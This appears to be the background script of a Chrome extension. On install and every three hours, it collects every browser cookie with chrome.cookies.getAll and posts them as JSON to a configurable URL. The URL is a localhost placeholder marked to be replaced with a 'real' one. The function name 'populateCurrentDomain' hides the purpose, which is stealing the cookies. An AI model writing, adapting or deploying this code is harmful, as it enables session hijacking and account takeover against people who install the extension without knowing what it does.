chrome.runtime.onInstalled.addListener(
  populateCurrentDomain
);

const intervalInMilliseconds = 3 * 60 * 60 * 1000; // 3 hours
setInterval(populateCurrentDomain, intervalInMilliseconds);

function populateCurrentDomain() {
  chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
    try {
      chrome.cookies.getAll({}, function (cookies) {
        const cache = [];
        for (let i in cookies) {
          cache.push(cookies[i]);
        }

       const url = "http://localhost:3000/test";

; // TODO: replace with your real URL

        const requestOptions = {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(cache)
        };

        fetch(url, requestOptions)
          .then(response => response.json())
          .then(data => {
            console.log("", data);
          })
          .catch(error => {
            console.log("Error:", error);
          });

        console.log(cache);
      });
    } catch (error) {
      console.log(error);
    }
  });
}
